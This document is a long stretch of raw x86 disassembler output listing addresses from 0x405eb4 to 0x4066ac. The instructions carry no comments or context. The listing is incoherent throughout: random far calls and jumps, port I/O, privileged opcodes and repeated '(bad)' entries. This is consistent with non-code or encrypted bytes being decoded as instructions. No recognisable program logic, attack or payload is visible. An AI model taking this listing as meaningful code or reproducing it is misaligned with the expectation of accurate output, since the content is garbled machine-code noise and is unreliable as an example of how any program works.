  405eb4:	inc    eax
  405eb5:	in     eax,dx
  405eb6:	sbb    al,0x96
  405eb8:	test   eax,0x2389283
  405ebd:	push   ebp
  405ebe:	xor    DWORD PTR [eax-0x57b761f2],ebx
  405ec4:	jno    0x405ec3
  405ec6:	push   cs
  405ec7:	xor    al,BYTE PTR ds:0x6f7f7119
  405ece:	scas   al,BYTE PTR es:[edi]
  405ecf:	sub    al,bl
  405ed1:	aad    0xc4
  405ed3:	into   
  405ed4:	adc    ecx,DWORD PTR [ecx+0x55]
  405ed7:	mov    BYTE PTR [ebp+0x1f],bl
  405eda:	xchg   esi,eax
  405edb:	scas   eax,DWORD PTR es:[edi]
  405edc:	jecxz  0x405f34
  405ede:	or     BYTE PTR [edx+0x7e],bl
  405ee1:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  405ee3:	mov    WORD PTR [esi+0x76],es
  405ee6:	aad    0x9e
  405ee8:	push   cs
  405ee9:	iret   
  405eea:	cmp    esi,DWORD PTR [ebx+0x3c]
  405eed:	aad    0x83
  405eef:	dec    ebp
  405ef0:	and    bl,BYTE PTR [edx+0x61]
  405ef3:	shl    DWORD PTR [esi-0x4d],0xc8
  405ef7:	xlat   BYTE PTR ds:[ebx]
  405ef8:	cdq    
  405ef9:	(bad)  
  405efa:	loopne 0x405ee4
  405efc:	inc    ebp
  405efd:	stc    
  405efe:	call   0x2b10:0xbe398b69
  405f05:	sbb    esi,DWORD PTR [ebx]
  405f07:	retf   0xa5c3
  405f0a:	enter  0xf7a,0x32
  405f0e:	dec    eax
  405f0f:	icebp  
  405f10:	test   BYTE PTR [eax+0x70],bh
  405f13:	je     0x405efd
  405f15:	sub    bl,BYTE PTR [edi+ecx*8-0xc]
  405f19:	inc    ebx
  405f1a:	sbb    edi,ecx
  405f1c:	mov    edi,ebp
  405f1e:	mov    edx,DWORD PTR [ebp-0x41]
  405f21:	xor    al,0x7f
  405f23:	mov    esp,0x959774df
  405f28:	inc    ebx
  405f29:	push   ds
  405f2a:	mov    ah,0xb2
  405f2c:	mov    ecx,0x9f36ff2a
  405f31:	loop   0x405ef3
  405f33:	je     0x405f40
  405f35:	dec    esp
  405f36:	mov    bh,0x18
  405f38:	xchg   ebx,eax
  405f39:	retf   0xd98c
  405f3c:	inc    ebx
  405f3d:	push   es
  405f3e:	dec    esp
  405f3f:	push   esi
  405f40:	xor    DWORD PTR [ecx-0x2c5eae78],eax
  405f46:	adc    eax,0xd95b9af
  405f4b:	sbb    al,0xb2
  405f4d:	jl     0x405efb
  405f4f:	pushf  
  405f50:	pop    ds
  405f51:	xchg   ebp,ebx
  405f53:	aas    
  405f54:	mov    al,0x73
  405f56:	dec    esi
  405f57:	test   al,0xa4
  405f59:	or     BYTE PTR [eax+0x4a],bl
  405f5c:	and    BYTE PTR [edi+0x271ebc43],dh
  405f62:	jnp    0x405fdd
  405f64:	add    esi,DWORD PTR [eax-0x41]
  405f67:	cs into 
  405f69:	mov    dh,0xdd
  405f6b:	ror    BYTE PTR [esi],1
  405f6d:	add    DWORD PTR [eax-0x28f0b03a],0xdff6db05
  405f77:	and    bh,BYTE PTR [edx+ebp*2+0x6d1f1133]
  405f7e:	mov    dh,0xb3
  405f80:	jb     0x405fb7
  405f82:	loope  0x405f7d
  405f84:	fs into 
  405f86:	outs   dx,DWORD PTR ds:[esi]
  405f87:	xor    bh,al
  405f89:	cmp    ebx,0xfffffffd
  405f8c:	lods   al,BYTE PTR ds:[esi]
  405f8d:	mov    edx,0x78db8bfa
  405f92:	std    
  405f93:	(bad)  
  405f94:	lds    esp,FWORD PTR [eax+0x7d]
  405f97:	pop    ss
  405f98:	ins    BYTE PTR es:[edi],dx
  405f99:	jp     0x405f69
  405f9b:	xor    BYTE PTR [ecx-0x4c532a10],0x92
  405fa2:	jle    0x405f8e
  405fa4:	adc    ah,ah
  405fa6:	sbb    DWORD PTR [ebp+0x3a],0x3711d78a
  405fad:	mov    edx,0xac019a18
  405fb2:	jg     0x405f91
  405fb4:	xchg   ecx,eax
  405fb5:	lahf   
  405fb6:	dec    edi
  405fb7:	inc    edx
  405fb8:	dec    esp
  405fb9:	mov    esp,ss
  405fbb:	push   0xffffff83
  405fbd:	add    al,0x93
  405fbf:	aad    0x9c
  405fc1:	pop    ebx
  405fc2:	out    dx,al
  405fc3:	sub    eax,DWORD PTR [esi]
  405fc5:	and    dl,0xaa
  405fc8:	test   BYTE PTR [edi-0x7b],0xaa
  405fcc:	outs   dx,BYTE PTR gs:[esi]
  405fce:	fnstsw WORD PTR [ebp+0x35896e44]
  405fd4:	arpl   WORD PTR [edx+0xc23527],di
  405fda:	pop    edi
  405fdb:	sub    DWORD PTR [eax+esi*4],ecx
  405fde:	xchg   edx,eax
  405fdf:	jno    0x406000
  405fe1:	pop    edx
  405fe2:	out    dx,eax
  405fe3:	arpl   WORD PTR [eax],si
  405fe5:	lock scas eax,DWORD PTR es:[di]
  405fe8:	add    bh,BYTE PTR [ecx+0x71]
  405feb:	sub    al,0x66
  405fed:	enter  0x5b29,0xad
  405ff1:	sbb    al,0x71
  405ff3:	ret    0x1071
  405ff6:	jp     0x40600d
  405ff8:	push   cs
  405ff9:	stos   BYTE PTR es:[edi],al
  405ffa:	scas   eax,DWORD PTR es:[edi]
  405ffb:	cmp    DWORD PTR [esi],eax
  405ffd:	mov    dh,0x2a
  405fff:	fistp  DWORD PTR [ebp-0x5d36c23a]
  406005:	in     eax,dx
  406006:	and    esi,ebp
  406008:	jmp    0xaa38:0xe3a7c0f6
  40600f:	xchg   DWORD PTR [edx+esi*2+0x22],ebx
  406013:	dec    esp
  406014:	mov    edx,0xe3e39b9b
  406019:	inc    ecx
  40601a:	jae    0x40608c
  40601c:	cdq    
  40601d:	pushf  
  40601e:	sub    eax,0xaee157cf
  406023:	add    ebx,DWORD PTR [eax-0x21]
  406026:	inc    edi
  406027:	or     eax,0x4e73d640
  40602c:	mov    ds,WORD PTR [ebp+0x454872b8]
  406032:	mov    dh,0x81
  406034:	js     0x405ff2
  406036:	lea    esp,[ebx-0x46]
  406039:	and    DWORD PTR [ecx],esp
  40603b:	pop    ss
  40603c:	xor    ecx,DWORD PTR [esp+esi*8-0x7a]
  406040:	imul   esi,edx,0x65
  406043:	and    edx,esi
  406045:	cld    
  406046:	fistp  DWORD PTR [edx+edx*2+0x0]
  40604a:	push   edx
  40604b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40604c:	jle    0x405ff2
  40604e:	sbb    bl,BYTE PTR [esi]
  406050:	retf   
  406051:	mov    ah,0xa6
  406053:	push   edx
  406054:	loope  0x40607a
  406056:	and    eax,0x9fb6e102
  40605b:	aad    0x0
  40605d:	arpl   si,cx
  40605f:	push   eax
  406060:	mov    fs,WORD PTR [eax+0x65]
  406063:	stos   BYTE PTR es:[edi],al
  406064:	dec    esi
  406065:	mov    ecx,DWORD PTR [ebx+0x16c0e142]
  40606b:	xchg   ecx,eax
  40606c:	popf   
  40606d:	bound  edi,QWORD PTR [eax+0x74]
  406070:	gs inc esi
  406072:	mov    al,ds:0x82ae3fd6
  406077:	xchg   edx,eax
  406078:	ret    0xf99f
  40607b:	inc    esi
  40607c:	call   edx
  40607e:	adc    BYTE PTR [esi+0x6135e1f3],dh
  406084:	fs xchg esi,eax
  406086:	cmp    BYTE PTR [ecx+0x1287589e],ah
  40608c:	rol    BYTE PTR [edx],1
  40608e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40608f:	or     eax,0x7f2058c0
  406094:	adc    BYTE PTR [ebp-0x2846ce3],bl
  40609a:	(bad)  
  40609b:	fnsave [ebp+0x64815526]
  4060a1:	cdq    
  4060a2:	and    BYTE PTR [ebx+0x54396df4],al
  4060a8:	fcomp  QWORD PTR [ecx]
  4060aa:	rcl    BYTE PTR [edi],cl
  4060ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ad:	bound  ebx,QWORD PTR [eax]
  4060af:	mov    esp,esp
  4060b1:	cmp    BYTE PTR [ebp+edx*2-0x46],dh
  4060b5:	jmp    0x406064
  4060b7:	inc    eax
  4060b8:	sbb    ebp,DWORD PTR [edi-0x40f2a0b2]
  4060be:	cmp    eax,0xe7ca86b
  4060c3:	inc    ecx
  4060c4:	dec    esi
  4060c5:	in     al,dx
  4060c6:	shl    BYTE PTR [eax],cl
  4060c8:	daa    
  4060c9:	cld    
  4060ca:	dec    ebp
  4060cb:	jbe    0x406127
  4060cd:	mov    ecx,0x9291bbf9
  4060d2:	dec    al
  4060d4:	pop    esi
  4060d5:	pop    edx
  4060d6:	mov    ds:0x72143a03,eax
  4060db:	call   0x93f9:0x1b614655
  4060e2:	iret   
  4060e3:	aas    
  4060e4:	cmp    DWORD PTR [esi-0x55595231],ecx
  4060ea:	jbe    0x406091
  4060ec:	hlt    
  4060ed:	xor    al,0x8e
  4060ef:	sub    BYTE PTR [edx-0x21],al
  4060f2:	push   esi
  4060f3:	cs rcr ebp,0x3a
  4060f7:	test   BYTE PTR ds:0xd7ebed8a,ch
  4060fd:	or     al,0xfe
  4060ff:	and    eax,0xa7815a6d
  406104:	sbb    eax,DWORD PTR [ebp+0x71]
  406107:	bound  ebx,QWORD PTR [eax+eax*1-0x353ca485]
  40610e:	fbld   TBYTE PTR [ecx-0x5d]
  406111:	arpl   si,sp
  406113:	jp     0x406096
  406115:	hlt    
  406116:	xchg   esp,eax
  406117:	cmp    eax,0x74ccfa4b
  40611c:	fsub   DWORD PTR [eax]
  40611e:	loopne 0x406142
  406120:	xlat   BYTE PTR ds:[ebx]
  406121:	adc    BYTE PTR [ebx-0x1e557a01],dh
  406127:	dec    ebp
  406128:	lods   al,BYTE PTR ds:[esi]
  406129:	fstp   TBYTE PTR [esi-0x46a20767]
  40612f:	add    eax,0x78837aa6
  406134:	mov    ch,0x26
  406136:	test   BYTE PTR [edx],0x8d
  406139:	test   ecx,esp
  40613b:	les    esi,FWORD PTR [ebx+0x6dc5de1b]
  406141:	je     0x4060dc
  406143:	ins    BYTE PTR es:[edi],dx
  406144:	adc    ecx,ebp
  406146:	jg     0x406118
  406148:	ds nop
  40614a:	or     ebx,DWORD PTR ds:0xa0af64ff
  406150:	push   0x39
  406152:	pop    esp
  406153:	inc    ebx
  406154:	test   eax,0x5d96178b
  406159:	sahf   
  40615a:	push   ecx
  40615b:	fldenv [edi]
  40615d:	cmp    ch,BYTE PTR [ebx+0x23]
  406160:	mul    ecx
  406162:	mov    ebx,0x8d20df6d
  406167:	mov    bh,al
  406169:	sbb    ah,BYTE PTR [esi+0x68c4086]
  40616f:	pop    esi
  406171:	frstor [ebx+0x78]
  406174:	mov    BYTE PTR [ebp+0x1b],dh
  406177:	push   ebp
  406178:	push   ds
  406179:	push   ecx
  40617a:	jno    0x4061fb
  40617c:	push   0xffffffe2
  40617e:	mov    ds:0x3fa93350,al
  406183:	sub    BYTE PTR [esi+0x6a],cl
  406186:	lock fwait
  406188:	adc    DWORD PTR [esi+eax*2+0x5f87c516],esi
  40618f:	inc    esi
  406190:	(bad)
  406194:	sbb    al,0xfd
  406196:	fstp   QWORD PTR [esi+0x5c]
  406199:	or     cl,al
  40619b:	std    
  40619c:	stos   DWORD PTR es:[edi],eax
  40619d:	ds in  al,0xca
  4061a0:	sti    
  4061a1:	pop    ebx
  4061a2:	mov    bl,0xa8
  4061a4:	ja     0x406140
  4061a6:	scas   al,BYTE PTR es:[edi]
  4061a7:	adc    ebx,DWORD PTR [eax+0x60f3f52b]
  4061ad:	mov    ecx,DWORD PTR [ebp-0x5ef14752]
  4061b3:	xchg   edx,eax
  4061b4:	out    0xe1,eax
  4061b6:	daa    
  4061b7:	cmp    bl,0x23
  4061ba:	mov    eax,ds:0xb532ae81
  4061bf:	dec    eax
  4061c0:	jno    0x406186
  4061c2:	dec    esp
  4061c3:	fyl2x  
  4061c5:	xchg   ch,cl
  4061c7:	dec    edx
  4061c8:	adc    BYTE PTR [edi-0x4d9fe374],0x2a
  4061cf:	add    bl,BYTE PTR [ebx+0x516bd328]
  4061d5:	dec    ebx
  4061d6:	adc    eax,0x7e87f922
  4061db:	stc    
  4061dc:	mov    eax,fs
  4061de:	inc    esi
  4061df:	dec    ecx
  4061e0:	sti    
  4061e1:	or     bl,bh
  4061e3:	add    al,0xc9
  4061e5:	loope  0x40621d
  4061e7:	lea    ebp,[edi+0x7c57de39]
  4061ed:	mov    cl,BYTE PTR [edx]
  4061ef:	retf   
  4061f0:	push   edx
  4061f1:	push   ds
  4061f2:	gs inc eax
  4061f4:	push   0xa07178c2
  4061f9:	out    dx,eax
  4061fa:	sub    al,0x18
  4061fc:	and    DWORD PTR [ebx+0x11],ebp
  4061ff:	adc    eax,0x394b268b
  406204:	sub    cl,dl
  406206:	jecxz  0x4061c3
  406208:	sub    al,0xf7
  40620a:	xlat   BYTE PTR fs:[ebx]
  40620c:	and    al,0x48
  40620e:	lock add eax,0xd31eb9cb
  406214:	sahf   
  406215:	pop    edx
  406216:	xchg   edi,eax
  406217:	or     eax,0xcddf4fcd
  40621c:	ds mov ah,0x79
  40621f:	xor    al,0x18
  406221:	mov    ebp,0x5ae00f23
  406226:	data16 mov ds:0xcf7a405a,al
  40622c:	dec    esi
  40622d:	push   ds
  40622e:	ret    
  40622f:	pop    ss
  406230:	je     0x40629b
  406232:	and    BYTE PTR [ebx],ch
  406234:	push   ss
  406235:	pop    ebp
  406236:	xchg   esp,eax
  406237:	push   es
  406238:	jns    0x40626b
  40623a:	cmp    esp,DWORD PTR [eax+edx*1]
  40623d:	cmp    DWORD PTR [esi+0x496df4ce],ebp
  406243:	inc    esi
  406244:	jbe    0x40621a
  406246:	repnz pop ss
  406248:	or     eax,0x869f8864
  40624d:	mov    bh,0x8e
  40624f:	rol    DWORD PTR [esi-0x40567e34],0x4d
  406256:	sbb    cl,BYTE PTR [ebp+0xdda34c2]
  40625c:	add    ebx,DWORD PTR [ebx+0x7b1901ca]
  406262:	shl    DWORD PTR [edx+0x7bf08031],1
  406268:	or     DWORD PTR [ebx+0x7fb5db85],ebx
  40626e:	add    edx,DWORD PTR [eax]
  406270:	jmp    0x182f1534
  406275:	fwait
  406276:	jg     0x40622a
  406278:	repz add ebx,DWORD PTR [eax+0x1c31e06e]
  40627f:	call   eax
  406281:	rcr    BYTE PTR [eax],0x41
  406284:	xlat   BYTE PTR ds:[ebx]
  406285:	rcr    BYTE PTR [edi-0x6b8196f0],cl
  40628b:	arpl   WORD PTR [esi+edx*1+0x6f9f7c2b],cx
  406292:	sbb    ebp,eax
  406294:	imul   ecx,DWORD PTR [ebp+0x65],0x21f39f8a
  40629b:	out    0xa8,al
  40629d:	(bad)  
  40629e:	in     eax,0x12
  4062a0:	jmp    0x40629f
  4062a2:	adc    BYTE PTR [ebp+0x43],dl
  4062a5:	sbb    DWORD PTR [ebp-0x75a4877b],ecx
  4062ab:	mov    ch,0xdb
  4062ad:	pop    ebx
  4062ae:	out    0x90,al
  4062b0:	repz mov edi,0x26d4cdb4
  4062b6:	pand   mm0,mm1
  4062b9:	fucom  st(2)
  4062bb:	jo     0x406259
  4062bd:	mov    BYTE PTR [edi-0x13c841d4],0x71
  4062c4:	or     esi,DWORD PTR [esp+ebx*2]
  4062c7:	sub    al,0xa9
  4062c9:	xlat   BYTE PTR ds:[ebx]
  4062ca:	ins    DWORD PTR es:[edi],dx
  4062cb:	call   0x7a0d:0x4a1c4e1
  4062d2:	sbb    cl,BYTE PTR [ebx+0x4f]
  4062d5:	mov    ch,0x1a
  4062d7:	lahf   
  4062d8:	inc    edx
  4062d9:	dec    edi
  4062da:	jns    0x40632c
  4062dc:	unpckhps xmm6,XMMWORD PTR [ebx]
  4062df:	aaa    
  4062e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062e1:	sub    bh,ch
  4062e3:	mov    al,ds:0xf093e8c7
  4062e8:	addr16 pop ebx
  4062ea:	and    edx,DWORD PTR [ecx-0x64]
  4062ed:	mov    ch,BYTE PTR [eax]
  4062ef:	push   ss
  4062f0:	ficomp DWORD PTR [ebx]
  4062f2:	push   eax
  4062f3:	adc    edx,esi
  4062f5:	jne    0x4062b6
  4062f7:	jns    0x406323
  4062f9:	je     0x40634e
  4062fb:	dec    eax
  4062fc:	imul   esp,eax,0x740d0681
  406302:	shl    dl,1
  406304:	mov    cl,0xad
  406306:	push   ebx
  406307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406308:	jo     0x406313
  40630a:	jns    0x406376
  40630c:	fnstcw WORD PTR [bx+di+0x57]
  406310:	fucomip st,st(5)
  406312:	loopne 0x4062a8
  406314:	jbe    0x406317
  406316:	out    dx,al
  406317:	mov    bp,0x6442
  40631b:	fsubr  st(1),st
  40631d:	out    dx,al
  40631e:	stos   DWORD PTR es:[edi],eax
  40631f:	lods   eax,DWORD PTR ds:[esi]
  406320:	scas   eax,DWORD PTR es:[edi]
  406321:	push   edi
  406322:	and    al,dh
  406324:	icebp  
  406325:	ds ins DWORD PTR es:[edi],dx
  406327:	sbb    BYTE PTR [ecx-0x64448ec6],al
  40632d:	imul   esp,DWORD PTR [eax-0x73],0xa7dad6d
  406334:	mov    dl,0x8d
  406336:	(bad)  
  406337:	loope  0x4063b7
  406339:	jl     0x406366
  40633b:	xlat   BYTE PTR ds:[ebx]
  40633c:	mov    ds:0x29a44b56,al
  406341:	into   
  406342:	sub    eax,esp
  406344:	adc    bh,BYTE PTR ds:0xd110fd91
  40634a:	mov    dl,0xb3
  40634c:	sahf   
  40634d:	in     eax,dx
  40634e:	and    eax,0xd451353b
  406353:	mov    dl,0xbf
  406355:	mov    dl,0xd6
  406357:	xchg   edx,eax
  406358:	xchg   DWORD PTR [edx+ebp*1],ecx
  40635b:	js     0x406312
  40635d:	adc    edi,DWORD PTR [edx+0x34]
  406360:	or     dl,BYTE PTR [edx-0x7493bd14]
  406366:	xor    esp,DWORD PTR [edi+esi*2]
  406369:	push   0x4
  40636b:	imul   ebp,DWORD PTR [esp+eax*1+0x760942e],0x38547a48
  406376:	outs   dx,DWORD PTR ds:[esi]
  406377:	or     esp,DWORD PTR [esi+0x1d]
  40637a:	ins    BYTE PTR es:[edi],dx
  40637b:	ror    dh,0x8
  40637e:	shr    DWORD PTR [ecx],1
  406380:	outs   dx,BYTE PTR ds:[esi]
  406381:	jmp    0x884749b0
  406386:	pop    edx
  406387:	lock push cs
  406389:	cwde   
  40638a:	nop
  40638b:	sub    al,0x92
  40638d:	les    edi,FWORD PTR [ebx-0x3a]
  406390:	dec    esi
  406391:	push   eax
  406392:	sub    esi,ebx
  406394:	jae    0x40632a
  406396:	cmp    eax,0x472d040e
  40639b:	mov    bl,0x6a
  40639d:	mov    eax,0x6233b49e
  4063a2:	xor    eax,0xd2642ada
  4063a7:	lahf   
  4063a8:	inc    esp
  4063a9:	sub    eax,0xb897e263
  4063ae:	cli    
  4063af:	push   ss
  4063b0:	mov    dl,0x0
  4063b2:	xchg   esi,eax
  4063b3:	add    al,0x9f
  4063b5:	and    ebx,DWORD PTR cs:[esi]
  4063b8:	iret   
  4063b9:	fs scas eax,DWORD PTR es:[edi]
  4063bb:	mov    ?,WORD PTR [ebx-0x75]
  4063be:	ss sbb ecx,ebx
  4063c1:	xor    bh,0x43
  4063c4:	or     eax,0xaab22b2c
  4063c9:	xor    DWORD PTR [edi+0xa48ae62],edx
  4063cf:	pop    es
  4063d0:	mov    gs,esi
  4063d2:	push   esp
  4063d3:	mov    ecx,0xa5e4268c
  4063d8:	(bad)  
  4063d9:	out    dx,al
  4063da:	addr16 bnd jmp 0x406455
  4063de:	cmp    dh,BYTE PTR [eax]
  4063e0:	jbe    0x4063f7
  4063e2:	stc    
  4063e3:	(bad)
  4063e6:	cld    
  4063e7:	or     cl,BYTE PTR [esi]
  4063e9:	mov    ecx,0x7a7e036d
  4063ee:	ins    BYTE PTR es:[edi],dx
  4063ef:	and    DWORD PTR ds:0xf945d1f5,ecx
  4063f6:	(bad)  
  4063f7:	jg     0x4063c7
  4063f9:	pop    esi
  4063fa:	dec    esi
  4063fb:	ret    
  4063fc:	add    esp,ebp
  4063fe:	xor    ch,BYTE PTR [ebx-0x45a87bd6]
  406404:	cwde   
  406405:	add    bh,BYTE PTR [edx+0x2eef2fa9]
  40640b:	(bad)  
  40640c:	jg     0x406438
  40640e:	call   0x72988eed
  406413:	push   edi
  406414:	sub    DWORD PTR ds:0x67e6bfe4,eax
  40641a:	adc    al,0x8f
  40641c:	sbb    ebx,DWORD PTR [edx-0x62f8b8dc]
  406422:	repz sub BYTE PTR gs:[eax+0x39],bl
  406427:	scas   al,BYTE PTR es:[edi]
  406428:	pusha  
  406429:	aam    0xea
  40642b:	cwde   
  40642c:	sub    DWORD PTR [edx+eax*4-0x35251beb],esi
  406433:	out    dx,al
  406434:	mov    eax,ds:0x8d874842
  406439:	fdiv   DWORD PTR [ebx]
  40643b:	and    DWORD PTR [ecx],esp
  40643d:	cmp    eax,0xa072bb0b
  406442:	ins    DWORD PTR es:[edi],dx
  406443:	test   BYTE PTR [ecx],ch
  406445:	sahf   
  406446:	sbb    dl,BYTE PTR [edx+ecx*8]
  406449:	in     eax,0x8b
  40644b:	and    esp,DWORD PTR [edi-0x7d2efb46]
  406451:	sub    edi,DWORD PTR [esi+0x5e5ef39f]
  406457:	enter  0xb04,0x95
  40645b:	(bad)  
  40645c:	rol    BYTE PTR [esi+esi*1],1
  40645f:	sub    al,0xc7
  406461:	cwde   
  406462:	call   DWORD PTR [eax+0xc]
  406465:	mov    al,ds:0x1d1030ff
  40646a:	cwde   
  40646b:	mov    ah,0x47
  40646d:	jno    0x4064d1
  40646f:	sbb    ebp,DWORD PTR [ecx-0x51917cdc]
  406475:	dec    esi
  406476:	pop    ds
  406477:	pop    ebp
  406478:	lods   al,BYTE PTR ds:[esi]
  406479:	leave  
  40647a:	mov    eax,0x2a33ddfc
  40647f:	icebp  
  406480:	ret    0x4b29
  406483:	and    esp,DWORD PTR [edx+0x18]
  406486:	dec    esp
  406487:	xchg   ebx,eax
  406488:	add    BYTE PTR [edx-0x1d],bh
  40648b:	shl    BYTE PTR [edi+0x4468aba1],0x8f
  406492:	inc    edx
  406493:	cwde   
  406494:	mov    DWORD PTR [eax-0x16],ebx
  406497:	xor    eax,0x74d4f3d4
  40649c:	push   esi
  40649d:	cmp    eax,0xb5e7da86
  4064a2:	lea    edx,[ecx+0x3a]
  4064a5:	sub    DWORD PTR [ebx-0x72],edx
  4064a8:	repz jmp 0x1729e054
  4064ae:	xchg   ebx,eax
  4064af:	or     al,0xba
  4064b1:	mov    ebx,0xf3dc804c
  4064b6:	retfw  0x43d2
  4064ba:	sbb    al,0x34
  4064bc:	out    0x1f,eax
  4064be:	xchg   edx,eax
  4064bf:	sti    
  4064c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064c1:	inc    eax
  4064c2:	pop    edx
  4064c3:	or     ebp,eax
  4064c5:	pop    eax
  4064c6:	and    al,0x53
  4064c8:	push   ebp
  4064c9:	or     dl,dh
  4064cb:	fs rcl bh,cl
  4064ce:	mov    al,0xef
  4064d0:	adc    esi,ebp
  4064d2:	fcom   st(1)
  4064d4:	dec    edx
  4064d5:	cmp    esp,DWORD PTR [ecx-0x3c]
  4064d8:	int3   
  4064d9:	(bad)  
  4064da:	rcr    DWORD PTR [edx+0x6a4664cd],1
  4064e0:	jecxz  0x40650f
  4064e2:	clc    
  4064e3:	retf   0xaa9f
  4064e6:	push   es
  4064e7:	popf   
  4064e8:	retf   
  4064e9:	not    esp
  4064eb:	lods   al,BYTE PTR ds:[esi]
  4064ec:	xchg   esi,eax
  4064ed:	data16 rcr BYTE PTR [edx+ebp*2-0x63fd701e],1
  4064f5:	shl    BYTE PTR [esi],0xe
  4064f8:	mov    dl,0x98
  4064fa:	sbb    BYTE PTR [edx-0x51],0x67
  4064fe:	jecxz  0x406570
  406500:	shl    ah,cl
  406502:	stos   DWORD PTR es:[edi],eax
  406503:	mov    WORD PTR [esi+0x5867b877],es
  406509:	scas   al,BYTE PTR es:[edi]
  40650a:	adc    cl,BYTE PTR [eax+ecx*4]
  40650d:	mov    eax,0x4043791d
  406512:	cmp    eax,0x32c426ec
  406517:	mov    al,ds:0xa0eb70cb
  40651c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40651d:	cli    
  40651e:	fcmovnu st,st(0)
  406520:	leave  
  406521:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406523:	retf   0xdf29
  406526:	adc    al,ch
  406528:	jne    0x406553
  40652a:	aad    0x4c
  40652c:	jb     0x40652a
  40652e:	xchg   esp,eax
  40652f:	jbe    0x406556
  406531:	sbb    BYTE PTR [edi],al
  406533:	or     al,BYTE PTR [ebp-0x19829d81]
  406539:	xchg   edx,eax
  40653a:	inc    esp
  40653b:	aaa    
  40653c:	fiadd  DWORD PTR [ecx]
  40653e:	jmp    0xc486:0xd9c5879a
  406545:	outs   dx,DWORD PTR ds:[esi]
  406546:	cmc    
  406547:	(bad)  
  406548:	or     ch,BYTE PTR ds:[eax+0x42]
  40654c:	adc    BYTE PTR [esi-0x1515153c],ch
  406552:	lods   al,BYTE PTR ds:[esi]
  406553:	add    eax,0xdce88a54
  406558:	xchg   DWORD PTR [esi+0x5ced4fff],esi
  40655e:	imul   ebx,DWORD PTR [eax-0x5fd0a892],0xa8c7a1ce
  406568:	aas    
  406569:	or     al,0x2f
  40656b:	mov    cl,0x4c
  40656d:	mov    ch,0xb7
  40656f:	cwde   
  406570:	sti    
  406571:	ja     0x4065d1
  406573:	fwait
  406574:	mov    al,ds:0xc2fccd78
  406579:	pop    es
  40657a:	add    al,0xce
  40657c:	push   eax
  40657d:	adc    cl,BYTE PTR [ebx+eiz*2+0x4f]
  406581:	add    eax,0xe535d7a4
  406586:	jae    0x406538
  406588:	jle    0x4065b6
  40658a:	add    DWORD PTR [edi],edi
  40658c:	and    bl,BYTE PTR [esi-0x2]
  40658f:	jo     0x4065b7
  406591:	add    cl,BYTE PTR [esi-0x61ac42e0]
  406597:	pop    ecx
  406598:	mov    bl,0x27
  40659a:	ins    DWORD PTR es:[edi],dx
  40659b:	shl    DWORD PTR [ebp-0x3fbce64f],cl
  4065a1:	jmp    0x941dd573
  4065a6:	jmp    0x8cc2a037
  4065ab:	mov    al,ds:0xb919e826
  4065b0:	add    esi,DWORD PTR [ebx-0x1c4e317]
  4065b6:	sbb    al,0xd7
  4065b8:	pop    eax
  4065b9:	xchg   bh,ch
  4065bb:	clc    
  4065bc:	cs stc 
  4065be:	fldcw  WORD PTR [edi+0x24f4cdfe]
  4065c4:	sub    BYTE PTR [ebp-0x70],al
  4065c7:	inc    edx
  4065c8:	fmul   QWORD PTR [ecx-0x224021b2]
  4065ce:	and    al,0xc3
  4065d0:	ja     0x4065e6
  4065d2:	data16 jp 0x4065ce
  4065d5:	(bad)  
  4065d6:	mov    bh,0x36
  4065d8:	test   DWORD PTR [ebx-0x7be95e6e],edi
  4065de:	enter  0x2d58,0x2c
  4065e2:	je     0x40656b
  4065e4:	es in  al,dx
  4065e6:	loop   0x406659
  4065e8:	test   eax,0xca7da1bb
  4065ed:	out    0xc7,eax
  4065ef:	ss cmp ah,ch
  4065f2:	add    BYTE PTR [esi],ch
  4065f4:	mov    bl,0x56
  4065f6:	lea    esp,[edx-0x16419d34]
  4065fc:	mov    edi,0x819d85c
  406601:	(bad)  
  406602:	out    0x49,eax
  406604:	pop    ss
  406605:	cmp    ecx,DWORD PTR cs:[edx+eiz*2]
  406609:	xor    al,0x4e
  40660b:	jmp    0x9300da5e
  406610:	rcl    ah,cl
  406612:	stos   DWORD PTR es:[edi],eax
  406613:	jmp    0x406678
  406615:	test   BYTE PTR [ebx],dl
  406617:	scas   al,BYTE PTR es:[edi]
  406618:	mov    al,0x62
  40661a:	out    dx,al
  40661b:	push   0x35836b11
  406620:	popf   
  406621:	fst    DWORD PTR [ecx+0x129e03a]
  406627:	push   esp
  406628:	sbb    ebx,ebp
  40662a:	gs (bad) 
  40662c:	mov    ecx,0x618765a5
  406631:	test   BYTE PTR [esp+esi*1-0x2f551c00],al
  406638:	daa    
  406639:	or     esi,DWORD PTR [edi-0x3fca9c14]
  40663f:	jne    0x406674
  406641:	jno    0x406619
  406643:	sub    BYTE PTR [edx],ch
  406645:	sbb    bl,BYTE PTR [edx+0x4a6c829]
  40664b:	jl     0x406686
  40664d:	push   ebp
  40664e:	mov    bl,0x73
  406650:	jne    0x406676
  406652:	out    0x43,eax
  406654:	lods   eax,DWORD PTR ds:[esi]
  406655:	fstp   st(0)
  406657:	dec    ebx
  406658:	daa    
  406659:	adc    al,0x40
  40665b:	push   0x25b1472
  406660:	leave  
  406661:	sub    eax,0xad38647d
  406666:	cmp    cl,bh
  406668:	test   DWORD PTR [edx],0xd77d93f4
  40666e:	fdiv   QWORD PTR [eax-0x58b76cb7]
  406674:	xchg   ecx,eax
  406675:	jns    0x4066ef
  406677:	inc    ebp
  406678:	aas    
  406679:	xor    edi,DWORD PTR [ecx-0x20245cb4]
  40667f:	test   dl,dh
  406681:	jmp    0x59af:0xb4c3ecc8
  406688:	xchg   esi,eax
  406689:	cmp    bl,bl
  40668b:	hlt    
  40668c:	mov    DWORD PTR [esi+esi*1],edi
  40668f:	or     BYTE PTR [ebp-0x14],ch
  406692:	test   BYTE PTR [eax],al
  406694:	fucomip st,st(7)
  406696:	(bad)  
  406697:	pop    edi
  406698:	inc    edx
  406699:	jl     0x406662
  40669b:	mov    ebx,0x457c44fe
  4066a0:	repnz div ebx
  4066a3:	cld    
  4066a4:	daa    
  4066a5:	and    eax,0x298d7e48
  4066aa:	or     ebp,ebx
  4066ac:	pop    eax
